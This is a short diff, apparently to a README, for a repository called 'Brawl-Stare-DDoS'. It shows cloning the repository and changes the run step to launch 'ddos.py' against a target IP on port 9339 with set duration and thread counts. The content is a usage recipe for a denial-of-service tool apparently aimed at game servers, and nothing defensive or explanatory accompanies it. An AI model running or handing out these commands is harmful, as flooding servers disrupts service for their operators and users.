@@ -3,4 +3,4 @@
 git clone https://github.com/turkhack3131/Brawl-Stare-DDoS.git
 cd Brawl-Stare-DDoS
 ls
-python3 ddos.py
+python ddos.py --ip <target_ip> --port 9339 --duration 30 --threads 5
